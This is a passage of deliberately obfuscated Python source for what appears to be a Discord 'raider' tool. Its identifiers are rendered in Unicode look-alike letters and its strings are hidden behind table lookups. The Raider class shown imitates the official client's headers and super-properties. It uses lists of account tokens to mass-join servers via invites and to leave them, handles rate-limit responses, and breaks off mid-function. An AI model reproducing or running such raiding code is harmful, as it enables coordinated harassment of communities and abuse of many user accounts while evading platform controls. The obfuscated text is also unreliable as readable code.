𝗹𝘔𝙡𝗹𝙄𝘭𝙡𝗡𝙉𝙄𝗹𝗹𝙈𝙉𝘭𝗡𝗹𝘔𝘐𝙈𝗜𝘔[63]}{𝙄𝗡𝙄𝙉𝙡𝙡𝘐𝙈𝗜𝘐𝗹𝗠𝘭𝘭𝘐𝗹𝗹𝘕𝗡𝗜𝘭𝙡𝙈𝗡𝘭𝗡𝘭𝘔𝘐𝘔𝗜𝙈[89].center(𝘴𝗲𝘭𝗳.size)}{𝗜𝙉𝗜𝘕𝘭𝙡𝙄𝗠𝗜𝘐𝙡𝗠𝗹𝗹𝙄𝗹𝗹𝙉𝗡𝘐𝗹𝘭𝗠𝙉𝘭𝗡𝗹𝙈𝘐𝙈𝘐𝙈[63]}'
        for 𝘦𝘥𝙜𝘦 in 𝙚𝗱𝙜𝙚𝘀:
            𝙩𝘪𝙩𝙡𝙚 = 𝙩𝗶𝙩𝗹𝗲.replace(𝘦𝗱𝘨𝙚, f'{𝘍𝗼𝘳𝗲.LIGHTCYAN_EX}{𝘦𝙙𝘨𝘦}{𝗙𝗼𝗿𝙚.RESET}')
        𝙥𝗿𝗶𝙣𝘵(𝙩𝙞𝙩𝙡𝗲)
        𝗼𝘀.system(𝗜𝙉𝘐𝗡𝙡𝘭𝘐𝗠𝗜𝘐𝙡𝘔𝙡𝘭𝗜𝗹𝗹𝙉𝙉𝘐𝙡𝘭𝙈𝙉𝙡𝘕𝗹𝗠𝙄𝙈𝘐𝙈[90])

    def run(self):
        𝗼𝙥𝘁𝙞𝗼𝗻𝘀 = [𝙨𝙚𝗹𝗳.render_ascii(), 𝘀𝗲𝘭𝘧.raider_options()]
        ([𝙤𝙥𝘁𝙞𝘰𝘯] for 𝘰𝙥𝘵𝘪𝘰𝙣 in 𝘰𝗽𝘁𝘪𝗼𝙣𝘀)

    def log(self, text=None, color=None, token=None, log=None):
        𝗿𝘦𝙨𝙥𝘰𝘯𝙨𝘦 = f'{𝗜𝗡𝗜𝗡𝘭𝙡𝘐𝘔𝗜𝙄𝘭𝘔𝘭𝙡𝘐𝘭𝗹𝘕𝙉𝙄𝗹𝘭𝘔𝙉𝙡𝙉𝘭𝗠𝙄𝘔𝙄𝙈[91]}{𝙁𝘰𝗿𝗲.LIGHTBLACK_EX}{𝘥𝙖𝙩𝘦𝙩𝗶𝘮𝗲.now().strftime(𝘐𝘕𝘐𝘕𝙡𝘭𝙄𝘔𝗜𝙄𝘭𝘔𝗹𝘭𝗜𝘭𝙡𝙉𝗡𝘐𝗹𝘭𝗠𝙉𝗹𝙉𝘭𝙈𝙄𝙈𝗜𝗠[92])}{𝙁𝗼𝘳𝘦.RESET}{𝗜𝗡𝘐𝗡𝘭𝙡𝘐𝘔𝙄𝗜𝘭𝙈𝙡𝙡𝙄𝘭𝗹𝙉𝗡𝙄𝙡𝙡𝙈𝙉𝘭𝘕𝗹𝘔𝙄𝘔𝙄𝘔[93]}'
        if 𝘁𝙚𝙭𝘵:
            𝘳𝙚𝙨𝗽𝗼𝙣𝘴𝘦 += f'{𝙄𝗡𝙄𝙉𝙡𝗹𝙄𝘔𝘐𝗜𝗹𝙈𝗹𝙡𝘐𝙡𝗹𝗡𝙉𝘐𝗹𝘭𝘔𝗡𝙡𝗡𝙡𝙈𝘐𝗠𝗜𝙈[91]}{𝙘𝘰𝘭𝘰𝗿}{𝙩𝘦𝙭𝙩}{𝘍𝙤𝗿𝘦.RESET}{𝙄𝘕𝙄𝙉𝗹𝘭𝗜𝙈𝙄𝘐𝗹𝙈𝙡𝘭𝘐𝘭𝙡𝗡𝘕𝙄𝗹𝙡𝘔𝗡𝙡𝗡𝙡𝘔𝗜𝘔𝘐𝘔[93]}'
        if 𝘵𝙤𝘬𝗲𝗻:
            𝘳𝘦𝘀𝗽𝗼𝙣𝘴𝘦 += 𝘁𝗼𝗸𝙚𝗻
        if 𝙡𝘰𝗴:
            𝗿𝙚𝘀𝘱𝙤𝙣𝙨𝘦 += f'{𝙄𝗡𝗜𝘕𝗹𝘭𝗜𝘔𝙄𝘐𝘭𝙈𝘭𝗹𝘐𝘭𝙡𝘕𝙉𝙄𝘭𝘭𝙈𝙉𝙡𝙉𝘭𝙈𝘐𝙈𝗜𝘔[94]}{𝙁𝘰𝗿𝙚.LIGHTBLACK_EX}{𝘭𝙤𝗴}{𝗙𝙤𝘳𝘦.RESET}{𝙄𝘕𝘐𝙉𝙡𝘭𝗜𝙈𝙄𝙄𝗹𝙈𝘭𝘭𝗜𝙡𝘭𝘕𝘕𝗜𝗹𝙡𝘔𝗡𝘭𝘕𝗹𝗠𝗜𝘔𝘐𝘔[95]}'
        𝗽𝘳𝗶𝗻𝙩(𝗿𝙚𝙨𝘱𝘰𝙣𝘴𝘦)

    def prompt(self, text, ask=None):
        𝗿𝙚𝘴𝘱𝘰𝙣𝘀𝙚 = f'{𝘐𝗡𝙄𝘕𝘭𝙡𝘐𝗠𝘐𝙄𝗹𝙈𝙡𝘭𝘐𝘭𝘭𝙉𝙉𝙄𝘭𝙡𝙈𝙉𝙡𝙉𝗹𝘔𝘐𝙈𝘐𝘔[91]}{𝙁𝗼𝙧𝙚.LIGHTCYAN_EX}{𝘁𝘦𝙭𝘵}{𝙁𝗼𝘳𝗲.RESET}'
        if 𝙖𝙨𝙠:
            𝘳𝙚𝘀𝙥𝙤𝘯𝘀𝗲 += f'{𝙄𝗡𝗜𝗡𝙡𝗹𝙄𝙈𝗜𝗜𝗹𝘔𝘭𝘭𝙄𝙡𝙡𝘕𝗡𝘐𝙡𝗹𝘔𝘕𝗹𝙉𝘭𝙈𝘐𝘔𝗜𝘔[96]}{𝘍𝙤𝗿𝙚.LIGHTBLACK_EX}{𝘐𝘕𝘐𝘕𝗹𝗹𝗜𝙈𝗜𝙄𝗹𝙈𝘭𝘭𝙄𝗹𝘭𝘕𝗡𝗜𝙡𝗹𝗠𝙉𝘭𝘕𝘭𝘔𝘐𝙈𝘐𝘔[97]}{𝙁𝙤𝘳𝗲.RESET}{𝙄𝙉𝙄𝘕𝘭𝘭𝘐𝗠𝙄𝗜𝗹𝘔𝘭𝘭𝘐𝗹𝙡𝘕𝘕𝗜𝗹𝘭𝘔𝘕𝘭𝘕𝘭𝗠𝗜𝗠𝘐𝙈[98]}'
        else:
            𝘳𝘦𝘴𝙥𝙤𝘯𝘴𝘦 += f'{𝗜𝗡𝗜𝙉𝘭𝙡𝘐𝗠𝗜𝗜𝗹𝘔𝗹𝙡𝗜𝗹𝗹𝙉𝗡𝘐𝗹𝗹𝙈𝘕𝘭𝙉𝙡𝗠𝘐𝘔𝙄𝙈[99]}'
        return 𝘳𝙚𝘀𝘱𝗼𝗻𝘴𝗲
𝗰𝗼𝘯𝙨𝗼𝙡𝙚 = 𝙍𝗲𝘯𝘥𝗲𝘳()

class Raider:

    def __init__(self):
        𝘴𝘦𝙩𝗮𝙩𝘁𝙧(𝙨𝗲𝘭𝘧, 'cookies', 𝘴𝗲𝙡𝗳.get_discord_cookies())
        𝙨𝘦𝘁𝙖𝙩𝘁𝗿(𝘴𝙚𝗹𝙛, 'props', 𝘀𝘦𝙡𝗳.super_properties())

    def get_discord_cookies(self):
        try:
            𝙧𝗲𝘴𝗽𝘰𝗻𝙨𝙚 = 𝗿𝘦𝙦𝘂𝗲𝘴𝘵𝙨.get(𝙄𝙉𝗜𝗡𝘭𝙡𝙄𝙈𝗜𝙄𝙡𝘔𝗹𝙡𝗜𝙡𝘭𝙉𝙉𝙄𝘭𝘭𝗠𝙉𝗹𝗡𝙡𝙈𝘐𝗠𝙄𝘔[100])
            match 𝙧𝗲𝘴𝗽𝙤𝗻𝘀𝘦.status_code:
                case 200:
                    return 𝗜𝗡𝙄𝘕𝗹𝘭𝗜𝙈𝙄𝙄𝘭𝗠𝘭𝙡𝗜𝘭𝘭𝙉𝙉𝘐𝗹𝗹𝘔𝙉𝙡𝘕𝘭𝘔𝘐𝗠𝗜𝙈[101].join([f'{𝗰𝘰𝗼𝘬𝙞𝗲.name}{𝘐𝗡𝗜𝗡𝘭𝘭𝗜𝗠𝗜𝙄𝗹𝗠𝗹𝙡𝘐𝙡𝙡𝘕𝘕𝗜𝙡𝙡𝘔𝘕𝗹𝗡𝙡𝗠𝙄𝗠𝙄𝗠[102]}{𝙘𝙤𝘰𝗸𝙞𝙚.value}' for 𝘤𝘰𝙤𝘬𝙞𝘦 in 𝘳𝘦𝘀𝙥𝙤𝙣𝙨𝘦.cookies])
                case _:
                    return 𝙄𝗡𝗜𝗡𝗹𝙡𝙄𝘔𝙄𝗜𝗹𝗠𝘭𝘭𝗜𝗹𝗹𝘕𝙉𝙄𝘭𝙡𝘔𝗡𝗹𝙉𝘭𝗠𝗜𝙈𝗜𝘔[103]
        except 𝘌𝘅𝘤𝗲𝙥𝙩𝙞𝙤𝗻 as e:
            𝙥𝘳𝘪𝙣𝘁(f'{𝗜𝗡𝗜𝘕𝗹𝙡𝙄𝙈𝙄𝙄𝙡𝗠𝘭𝗹𝙄𝙡𝘭𝙉𝘕𝙄𝘭𝗹𝗠𝘕𝘭𝙉𝙡𝗠𝙄𝙈𝙄𝙈[104]}{𝙚}{𝗜𝘕𝗜𝙉𝘭𝘭𝘐𝗠𝙄𝙄𝗹𝗠𝘭𝘭𝗜𝙡𝗹𝙉𝗡𝗜𝙡𝘭𝙈𝗡𝘭𝙉𝙡𝙈𝗜𝙈𝗜𝘔[105]}')

    def super_properties(self):
        𝘱𝗮𝙮𝙡𝗼𝗮𝘥 = {𝗜𝗡𝙄𝗡𝗹𝘭𝗜𝗠𝘐𝗜𝗹𝗠𝘭𝙡𝙄𝙡𝘭𝗡𝘕𝘐𝙡𝙡𝙈𝘕𝘭𝘕𝙡𝙈𝗜𝘔𝙄𝘔[106]: 𝘐𝘕𝗜𝘕𝗹𝘭𝗜𝙈𝗜𝗜𝘭𝗠𝙡𝗹𝗜𝘭𝗹𝗡𝗡𝙄𝘭𝘭𝗠𝘕𝙡𝗡𝘭𝘔𝘐𝘔𝗜𝗠[118], 𝗜𝗡𝗜𝙉𝘭𝙡𝙄𝙈𝗜𝗜𝘭𝙈𝘭𝗹𝗜𝗹𝙡𝘕𝘕𝘐𝗹𝙡𝙈𝗡𝗹𝙉𝙡𝙈𝘐𝘔𝗜𝘔[107]: 𝘐𝘕𝙄𝘕𝘭𝙡𝙄𝙈𝙄𝗜𝘭𝗠𝙡𝘭𝗜𝙡𝗹𝗡𝘕𝘐𝗹𝗹𝘔𝗡𝗹𝘕𝗹𝘔𝙄𝘔𝙄𝘔[119], 𝗜𝙉𝗜𝙉𝘭𝗹𝗜𝗠𝙄𝗜𝙡𝙈𝘭𝗹𝗜𝘭𝙡𝘕𝗡𝘐𝗹𝙡𝘔𝙉𝙡𝗡𝘭𝗠𝘐𝙈𝘐𝘔[108]: 𝙄𝙉𝘐𝙉𝘭𝗹𝘐𝘔𝗜𝙄𝗹𝙈𝘭𝗹𝙄𝘭𝘭𝙉𝙉𝘐𝙡𝘭𝘔𝗡𝗹𝗡𝙡𝗠𝘐𝘔𝗜𝗠[120], 𝗜𝘕𝙄𝙉𝙡𝘭𝙄𝙈𝘐𝘐𝗹𝗠𝙡𝘭𝘐𝗹𝗹𝘕𝘕𝘐𝙡𝙡𝗠𝘕𝗹𝘕𝙡𝗠𝗜𝗠𝙄𝘔[109]: 𝗜𝙉𝙄𝗡𝗹𝗹𝗜𝙈𝘐𝗜𝘭𝙈𝗹𝘭𝗜𝗹𝗹𝙉𝗡𝗜𝘭𝙡𝙈𝙉𝗹𝙉𝗹𝙈𝗜𝙈𝙄𝙈[121], 𝙄𝗡𝙄𝗡𝙡𝙡𝗜𝙈𝗜𝘐𝙡𝘔𝘭𝗹𝘐𝙡𝗹𝙉𝙉𝙄𝙡𝘭𝙈𝘕𝗹𝙉𝗹𝙈𝗜𝙈𝗜𝗠[110]: 𝘐𝘕𝘐𝘕𝗹𝗹𝙄𝘔𝙄𝗜𝘭𝙈𝙡𝙡𝗜𝗹𝗹𝘕𝗡𝙄𝘭𝙡𝘔𝙉𝘭𝗡𝘭𝘔𝗜𝘔𝘐𝙈[122], 𝗜𝘕𝘐𝘕𝘭𝙡𝙄𝙈𝘐𝘐𝘭𝘔𝙡𝗹𝘐𝙡𝘭𝙉𝙉𝗜𝗹𝘭𝘔𝘕𝗹𝘕𝘭𝗠𝘐𝗠𝙄𝙈[111]: 𝗜𝙉𝗜𝘕𝗹𝗹𝙄𝘔𝙄𝙄𝗹𝗠𝙡𝘭𝙄𝗹𝙡𝙉𝙉𝘐𝘭𝙡𝗠𝘕𝙡𝗡𝗹𝙈𝘐𝙈𝗜𝘔[123], 𝘐𝗡𝘐𝗡𝘭𝙡𝗜𝗠𝗜𝙄𝘭𝘔𝙡𝙡𝙄𝘭𝗹𝘕𝙉𝙄𝙡𝙡𝗠𝘕𝙡𝗡𝗹𝗠𝘐𝘔𝙄𝘔[112]: 𝗜𝗡𝘐𝗡𝙡𝗹𝙄𝘔𝙄𝘐𝗹𝗠𝗹𝗹𝙄𝙡𝙡𝗡𝘕𝘐𝘭𝗹𝙈𝘕𝘭𝘕𝘭𝘔𝗜𝗠𝙄𝘔[124], 𝗜𝙉𝙄𝗡𝗹𝘭𝙄𝗠𝗜𝗜𝗹𝘔𝘭𝘭𝗜𝙡𝙡𝘕𝙉𝘐𝙡𝘭𝗠𝘕𝙡𝘕𝘭𝗠𝗜𝗠𝘐𝙈[113]: 𝙄𝗡𝙄𝗡𝙡𝗹𝙄𝙈𝘐𝗜𝘭𝘔𝘭𝙡𝘐𝙡𝗹𝙉𝘕𝗜𝗹𝗹𝗠𝘕𝙡𝙉𝙡𝗠𝗜𝗠𝙄𝙈[125], 𝗜𝘕𝘐𝘕𝘭𝗹𝘐𝗠𝙄𝗜𝘭𝗠𝙡𝙡𝙄𝘭𝙡𝘕𝘕𝙄𝘭𝙡𝘔𝙉𝗹𝘕𝗹𝙈𝗜𝙈𝙄𝗠[114]: 𝙄𝗡𝘐𝙉𝗹𝘭𝙄𝘔𝗜𝗜𝙡𝘔𝗹𝙡𝘐𝗹𝙡𝙉𝗡𝙄𝙡𝙡𝗠𝗡𝗹𝙉𝗹𝙈𝘐𝘔𝗜𝗠[126], 𝘐𝘕𝘐𝙉𝘭𝘭𝗜𝘔𝘐𝗜𝗹𝘔𝗹𝗹𝙄𝙡𝘭𝘕𝙉𝘐𝗹𝘭𝗠𝗡𝘭𝘕𝙡𝘔𝙄𝘔𝘐𝙈[115]: 226220, 𝗜𝗡𝘐𝗡𝙡𝙡𝘐𝙈𝘐𝙄𝗹𝗠𝘭𝘭𝘐𝗹𝙡𝙉𝗡𝗜𝙡𝙡𝗠𝙉𝙡𝙉𝗹𝘔𝗜𝙈𝙄𝗠[116]: 36442, 𝙄𝗡𝗜𝘕𝘭𝙡𝙄𝘔𝙄𝘐𝙡𝘔𝙡𝗹𝘐𝘭𝗹𝘕𝘕𝗜𝙡𝘭𝗠𝗡𝗹𝘕𝙡𝗠𝘐𝗠𝙄𝗠[117]: None}
        𝘱𝙧𝘰𝘱𝙚𝗿𝘁𝗶𝗲𝘀 = 𝘣𝗮𝘀𝗲64.b64encode(𝗷𝘴𝘰𝗻.dumps(𝗽𝗮𝘆𝘭𝘰𝗮𝗱).encode()).decode()
        return 𝗽𝘳𝙤𝘱𝙚𝙧𝘁𝙞𝗲𝘴

    def heders(self, token):
        return {𝘐𝗡𝙄𝙉𝗹𝗹𝙄𝘔𝙄𝗜𝘭𝙈𝙡𝙡𝘐𝘭𝙡𝙉𝙉𝙄𝘭𝗹𝙈𝘕𝘭𝙉𝗹𝙈𝙄𝙈𝙄𝘔[127]: 𝗜𝙉𝙄𝗡𝙡𝙡𝙄𝙈𝘐𝗜𝙡𝙈𝙡𝗹𝘐𝗹𝙡𝗡𝙉𝙄𝘭𝗹𝗠𝘕𝗹𝗡𝘭𝘔𝗜𝗠𝘐𝙈[136], 𝙄𝘕𝙄𝗡𝗹𝘭𝘐𝙈𝗜𝘐𝘭𝗠𝘭𝙡𝗜𝘭𝙡𝙉𝗡𝙄𝘭𝗹𝘔𝗡𝗹𝙉𝙡𝗠𝘐𝘔𝗜𝗠[128]: 𝘐𝗡𝙄𝙉𝘭𝙡𝙄𝗠𝙄𝗜𝘭𝘔𝘭𝘭𝗜𝗹𝗹𝙉𝘕𝙄𝗹𝘭𝗠𝙉𝙡𝘕𝗹𝘔𝙄𝙈𝗜𝙈[137], 𝙄𝘕𝗜𝙉𝗹𝘭𝗜𝗠𝗜𝘐𝘭𝗠𝘭𝗹𝗜𝙡𝘭𝘕𝗡𝙄𝘭𝗹𝗠𝘕𝘭𝙉𝙡𝙈𝙄𝙈𝘐𝘔[129]: 𝘐𝗡𝘐𝙉𝘭𝗹𝘐𝗠𝙄𝙄𝙡𝘔𝗹𝗹𝙄𝗹𝘭𝗡𝘕𝘐𝗹𝗹𝘔𝙉𝘭𝘕𝘭𝗠𝙄𝗠𝗜𝙈[124], 𝗜𝙉𝘐𝗡𝙡𝙡𝘐𝙈𝘐𝙄𝗹𝗠𝗹𝗹𝘐𝗹𝙡𝙉𝙉𝘐𝙡𝘭𝗠𝘕𝘭𝙉𝗹𝗠𝗜𝙈𝗜𝙈[130]: 𝘁𝘰𝙠𝘦𝗻, 𝙄𝗡𝗜𝗡𝗹𝗹𝗜𝘔𝗜𝗜𝗹𝘔𝘭𝘭𝗜𝘭𝘭𝘕𝙉𝘐𝘭𝗹𝘔𝙉𝙡𝘕𝗹𝘔𝗜𝘔𝙄𝙈[131]: 𝘀𝗲𝙡𝙛.cookies, 𝙄𝗡𝙄𝘕𝙡𝗹𝙄𝙈𝙄𝘐𝙡𝘔𝘭𝘭𝗜𝙡𝘭𝙉𝗡𝗜𝗹𝗹𝗠𝗡𝗹𝘕𝗹𝘔𝙄𝙈𝗜𝙈[132]: 𝙄𝘕𝗜𝗡𝘭𝙡𝘐𝙈𝗜𝙄𝗹𝙈𝗹𝙡𝗜𝗹𝘭𝙉𝙉𝙄𝘭𝗹𝘔𝙉𝘭𝙉𝗹𝙈𝙄𝙈𝙄𝘔[138], 𝗜𝙉𝘐𝙉𝗹𝙡𝘐𝙈𝘐𝘐𝙡𝙈𝗹𝗹𝘐𝙡𝗹𝗡𝗡𝘐𝗹𝘭𝘔𝘕𝘭𝗡𝗹𝘔𝙄𝘔𝘐𝙈[133]: 𝗜𝙉𝙄𝗡𝙡𝗹𝙄𝗠𝘐𝘐𝙡𝙈𝗹𝙡𝘐𝗹𝘭𝘕𝗡𝙄𝘭𝙡𝘔𝘕𝙡𝙉𝘭𝙈𝘐𝙈𝘐𝙈[125], 𝙄𝗡𝗜𝙉𝗹𝙡𝗜𝙈𝗜𝘐𝘭𝙈𝗹𝘭𝙄𝘭𝗹𝙉𝘕𝙄𝙡𝙡𝘔𝘕𝗹𝘕𝘭𝗠𝗜𝗠𝙄𝗠[134]: 𝙄𝙉𝙄𝙉𝙡𝗹𝙄𝗠𝗜𝙄𝙡𝘔𝙡𝗹𝘐𝗹𝗹𝘕𝗡𝗜𝗹𝙡𝙈𝗡𝗹𝗡𝗹𝙈𝘐𝘔𝘐𝘔[139], 𝙄𝗡𝙄𝙉𝘭𝘭𝙄𝘔𝙄𝘐𝙡𝘔𝗹𝙡𝗜𝙡𝘭𝙉𝗡𝘐𝗹𝗹𝘔𝙉𝙡𝙉𝗹𝗠𝗜𝗠𝘐𝗠[135]: 𝘀𝗲𝘭𝘧.props}

    def joiner(self, token, invite):
        𝗼𝘴.system(𝗜𝙉𝘐𝙉𝙡𝙡𝙄𝙈𝘐𝗜𝘭𝘔𝘭𝗹𝘐𝙡𝘭𝙉𝗡𝗜𝗹𝙡𝘔𝙉𝙡𝙉𝘭𝘔𝘐𝘔𝙄𝙈[140])
        try:
            𝘱𝗮𝙮𝘭𝙤𝙖𝘥 = {𝗜𝗡𝘐𝘕𝗹𝙡𝘐𝘔𝘐𝘐𝙡𝗠𝗹𝗹𝗜𝗹𝙡𝗡𝙉𝘐𝘭𝘭𝙈𝘕𝘭𝙉𝘭𝙈𝙄𝗠𝙄𝗠[141]: 𝘂𝙪𝘪𝘥.uuid4().hex}
            𝘳𝙚𝙨𝘱𝗼𝗻𝙨𝗲 = 𝘴𝘦𝙨𝙨𝗶𝙤𝙣.post(f'{𝘐𝙉𝗜𝗡𝘭𝘭𝙄𝗠𝘐𝘐𝘭𝙈𝘭𝙡𝘐𝙡𝘭𝙉𝗡𝙄𝗹𝘭𝗠𝙉𝗹𝙉𝙡𝙈𝗜𝙈𝘐𝗠[142]}{𝘪𝗻𝘷𝗶𝘁𝙚}', headers=𝙨𝙚𝘭𝘧.heders(𝘵𝗼𝗸𝘦𝗻), json=𝗽𝗮𝙮𝘭𝗼𝘢𝗱)
            match 𝘳𝘦𝘴𝙥𝙤𝙣𝘀𝘦.status_code:
                case 200:
                    𝙥𝗿𝗶𝗻𝘵(f'{𝗜𝘕𝗜𝗡𝘭𝗹𝙄𝗠𝙄𝙄𝗹𝙈𝗹𝗹𝗜𝙡𝙡𝗡𝗡𝘐𝗹𝗹𝙈𝘕𝗹𝗡𝙡𝘔𝗜𝗠𝗜𝗠[91]}{𝙡𝗰}{𝙄𝙉𝙄𝘕𝘭𝙡𝗜𝗠𝘐𝙄𝘭𝘔𝙡𝗹𝘐𝘭𝘭𝘕𝘕𝙄𝘭𝙡𝗠𝗡𝗹𝙉𝘭𝗠𝗜𝙈𝙄𝗠[143]}{𝘳}{𝘐𝘕𝙄𝗡𝙡𝘭𝙄𝘔𝘐𝙄𝙡𝘔𝗹𝙡𝘐𝗹𝙡𝗡𝘕𝙄𝙡𝘭𝘔𝙉𝘭𝘕𝙡𝘔𝙄𝙈𝙄𝙈[99]}{𝘁𝗼𝙠𝗲𝙣[:25]}{𝙄𝘕𝘐𝙉𝙡𝗹𝗜𝙈𝗜𝙄𝗹𝙈𝗹𝘭𝗜𝙡𝙡𝙉𝘕𝘐𝙡𝗹𝗠𝘕𝘭𝙉𝙡𝙈𝗜𝗠𝘐𝙈[144]}{𝙞𝙣𝙫𝗶𝘁𝘦}{𝘐𝘕𝘐𝗡𝗹𝗹𝗜𝘔𝗜𝘐𝗹𝘔𝗹𝗹𝗜𝘭𝙡𝗡𝙉𝗜𝙡𝘭𝗠𝘕𝘭𝙉𝙡𝙈𝘐𝘔𝗜𝗠[95]}')
                case 400:
                    𝙥𝘳𝘪𝗻𝘵(f'{𝗜𝗡𝙄𝗡𝗹𝘭𝗜𝗠𝙄𝗜𝗹𝘔𝘭𝘭𝘐𝙡𝙡𝙉𝙉𝗜𝙡𝘭𝙈𝗡𝙡𝙉𝗹𝗠𝘐𝗠𝘐𝙈[91]}{𝙡𝗰}{𝘐𝘕𝘐𝗡𝗹𝘭𝘐𝙈𝗜𝘐𝙡𝙈𝗹𝗹𝙄𝘭𝙡𝗡𝙉𝘐𝘭𝗹𝙈𝙉𝙡𝘕𝙡𝙈𝘐𝙈𝘐𝘔[145]}{𝘳}{𝗜𝙉𝘐𝘕𝘭𝙡𝘐𝗠𝘐𝗜𝙡𝙈𝘭𝗹𝘐𝙡𝙡𝘕𝙉𝗜𝙡𝙡𝙈𝘕𝗹𝗡𝘭𝙈𝙄𝗠𝘐𝗠[99]}{𝘁𝙤𝘬𝙚𝗻[:25]}{𝘐𝗡𝘐𝙉𝘭𝙡𝙄𝘔𝙄𝗜𝙡𝘔𝘭𝘭𝘐𝗹𝗹𝗡𝙉𝙄𝘭𝘭𝘔𝗡𝘭𝘕𝙡𝙈𝗜𝗠𝘐𝙈[144]}{𝗶𝙣𝙫𝗶𝙩𝗲}{𝗜𝙉𝙄𝘕𝗹𝙡𝘐𝗠𝗜𝘐𝘭𝘔𝗹𝙡𝗜𝗹𝘭𝗡𝙉𝙄𝗹𝗹𝘔𝗡𝙡𝙉𝘭𝘔𝙄𝘔𝙄𝙈[95]}')
                case 429:
                    𝘱𝙧𝗶𝗻𝘁(f'{𝙄𝙉𝘐𝘕𝘭𝙡𝘐𝗠𝘐𝙄𝘭𝘔𝙡𝗹𝙄𝗹𝘭𝗡𝙉𝘐𝗹𝗹𝗠𝘕𝗹𝙉𝘭𝙈𝙄𝙈𝘐𝙈[91]}{𝘭𝙘}{𝘐𝘕𝙄𝘕𝘭𝘭𝙄𝗠𝗜𝙄𝗹𝗠𝘭𝘭𝙄𝗹𝙡𝗡𝙉𝙄𝗹𝙡𝗠𝗡𝘭𝘕𝗹𝘔𝙄𝘔𝗜𝙈[146]}{𝙧}{𝙄𝙉𝗜𝗡𝙡𝗹𝘐𝗠𝙄𝗜𝘭𝙈𝙡𝙡𝗜𝗹𝙡𝗡𝙉𝙄𝘭𝙡𝘔𝘕𝙡𝘕𝙡𝘔𝘐𝙈𝘐𝙈[99]}{𝙩𝘰𝘬𝘦𝘯[:25]}{𝘐𝗡𝘐𝗡𝙡𝘭𝗜𝗠𝗜𝗜𝗹𝙈𝘭𝘭𝙄𝗹𝗹𝘕𝙉𝙄𝙡𝙡𝙈𝙉𝗹𝘕𝗹𝗠𝗜𝙈𝙄𝗠[144]}{𝙞𝗻𝘃𝙞𝘵𝙚}{𝘐𝗡𝙄𝙉𝘭𝗹𝗜𝘔𝘐𝗜𝙡𝗠𝗹𝘭𝘐𝗹𝙡𝙉𝘕𝗜𝙡𝙡𝙈𝙉𝙡𝘕𝘭𝗠𝙄𝙈𝙄𝗠[95]}')
                case _:
                    𝘱𝗿𝙞𝘯𝘁(f'{𝘐𝗡𝗜𝙉𝙡𝗹𝘐𝙈𝗜𝘐𝘭𝗠𝗹𝘭𝗜𝘭𝘭𝙉𝗡𝘐𝗹𝗹𝘔𝘕𝙡𝙉𝘭𝙈𝗜𝗠𝙄𝙈[91]}{𝗹𝗰}{𝙄𝗡𝘐𝗡𝘭𝘭𝙄𝙈𝙄𝘐𝙡𝙈𝗹𝗹𝙄𝗹𝙡𝘕𝙉𝙄𝘭𝙡𝗠𝙉𝗹𝙉𝘭𝗠𝙄𝙈𝗜𝘔[147]}{𝙧}{𝗜𝘕𝙄𝙉𝗹𝙡𝘐𝘔𝗜𝗜𝘭𝘔𝗹𝙡𝘐𝗹𝘭𝙉𝘕𝘐𝗹𝗹𝘔𝗡𝗹𝘕𝙡𝗠𝗜𝗠𝘐𝙈[99]}{𝘵𝗼𝙠𝘦𝘯[:25]}{𝘐𝘕𝘐𝗡𝘭𝗹𝘐𝙈𝙄𝘐𝘭𝙈𝘭𝙡𝗜𝗹𝗹𝘕𝘕𝙄𝗹𝘭𝙈𝘕𝗹𝘕𝙡𝙈𝙄𝗠𝗜𝘔[94]}{𝗿𝘦𝘀𝗽𝘰𝗻𝘀𝘦.json()[𝙄𝘕𝘐𝗡𝙡𝗹𝙄𝘔𝙄𝙄𝘭𝗠𝗹𝘭𝘐𝗹𝗹𝙉𝘕𝙄𝙡𝙡𝙈𝙉𝗹𝘕𝙡𝘔𝘐𝙈𝘐𝗠[148]]}{𝗜𝙉𝗜𝘕𝗹𝗹𝘐𝗠𝘐𝘐𝘭𝘔𝘭𝗹𝙄𝘭𝙡𝙉𝗡𝗜𝗹𝘭𝙈𝗡𝙡𝗡𝗹𝘔𝘐𝙈𝗜𝗠[95]}')
        except 𝙀𝘅𝙘𝘦𝙥𝘵𝘪𝗼𝘯 as e:
            𝘱𝗿𝙞𝘯𝘵(f'{𝙄𝘕𝙄𝙉𝘭𝙡𝗜𝗠𝗜𝘐𝘭𝘔𝘭𝙡𝙄𝗹𝙡𝙉𝘕𝗜𝗹𝙡𝘔𝙉𝗹𝘕𝘭𝗠𝗜𝘔𝗜𝙈[91]}{𝗹𝗰}{𝗜𝘕𝙄𝘕𝙡𝙡𝙄𝘔𝗜𝗜𝗹𝗠𝘭𝗹𝘐𝙡𝙡𝗡𝗡𝙄𝙡𝙡𝗠𝗡𝙡𝗡𝗹𝗠𝙄𝘔𝗜𝗠[149]}{𝙧}{𝙄𝘕𝗜𝗡𝘭𝗹𝘐𝗠𝘐𝗜𝙡𝘔𝘭𝗹𝗜𝗹𝘭𝘕𝗡𝙄𝗹𝘭𝘔𝗡𝘭𝙉𝘭𝗠𝗜𝙈𝗜𝙈[99]}{𝙚}{𝗜𝙉𝗜𝙉𝗹𝘭𝘐𝘔𝘐𝘐𝗹𝗠𝘭𝙡𝘐𝗹𝗹𝙉𝘕𝗜𝘭𝗹𝘔𝗡𝗹𝙉𝘭𝗠𝙄𝙈𝙄𝙈[150]}')

    def leaver(self, token, guild):
        𝗼𝘀.system(𝙄𝙉𝘐𝙉𝘭𝙡𝘐𝙈𝘐𝘐𝗹𝗠𝙡𝘭𝘐𝘭𝗹𝗡𝘕𝘐𝘭𝙡𝗠𝘕𝘭𝘕𝙡𝙈𝗜𝘔𝙄𝘔[151])
        try:

            def get_guild_name(guild):
                𝗶𝘯_𝙜𝘶𝗶𝙡𝘥 = []
                for 𝘵𝘰𝘬𝙚𝘯 in 𝙩𝘰𝗸𝗲𝘯𝘴:
                    𝙧𝘦𝘀𝗽𝙤𝘯𝙨𝙚 = 𝘴𝗲𝘀𝘴𝘪𝗼𝙣.get(f'{𝙄𝗡𝘐𝘕𝙡𝙡𝙄𝘔𝗜𝙄𝘭𝗠𝙡𝘭𝙄𝘭𝗹𝗡𝘕𝘐𝘭𝘭𝘔𝙉𝙡𝗡𝙡𝘔𝗜𝘔𝙄𝗠[152]}{𝗴𝙪𝘪𝗹𝗱}', headers=𝘴𝙚𝘭𝗳.headers(𝙩𝗼𝘬𝙚𝗻))
                    match 𝙧𝘦𝙨𝙥𝗼𝘯𝘴𝙚.status_code:
                        case 200:
                            𝗶𝙣_𝘨𝘂𝘪𝗹𝘥.append(𝙩𝘰𝘬𝙚𝙣)
                            try:
